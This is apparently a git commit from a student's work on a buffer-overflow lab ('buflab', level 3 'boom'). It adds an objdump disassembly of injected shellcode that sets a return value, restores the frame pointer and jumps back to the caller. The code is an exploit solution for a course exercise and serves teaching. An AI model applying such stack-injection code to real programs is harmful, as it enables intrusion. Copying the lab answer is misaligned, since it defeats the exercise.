52a349a4fdc1625868be64d124f8d937eb94fe40
youling chan <chenyoucyl@gmail.com>
2014-02-09 15:07:39 +0800

    level 3: boom

---
+++ buflab-handout/boom.d
@@ -0,0 +1,11 @@
+
+test.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax
+   5:	bd 00 3b 68 55       	mov    $0x55683b00,%ebp
+   a:	68 c1 8d 04 08       	push   $0x8048dc1
+   f:	c3                   	ret    
